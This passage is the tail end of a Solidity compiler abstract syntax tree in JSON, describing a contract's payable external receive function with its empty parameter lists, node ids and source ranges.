																		"typeString": "tuple()"
																	}
																},
																"id": 560,
																"nodeType": "ExpressionStatement",
																"src": "1806:28:1"
															}
														}
													]
												}
											}
										]
									},
									"documentation": null,
									"id": 575,
									"implemented": true,
									"kind": "receive",
									"modifiers": [],
									"name": "",
									"nodeType": "FunctionDefinition",
									"overrides": null,
									"parameters": {
										"id": 533,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "1633:2:1"
									},
									"returnParameters": {
										"id": 534,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "1652:0:1"
									},
									"scope": 576,
									"src": "1626:300:1",
									"stateMutability": "payable",
									"virtual": false,
									"visibility": "external"
								}
							],
							"scope": 577,
							"src": "798:1133:1"
						}
					],
					"src": "33:1898:1"
				},
				"id": 1
			}
		}
	}
}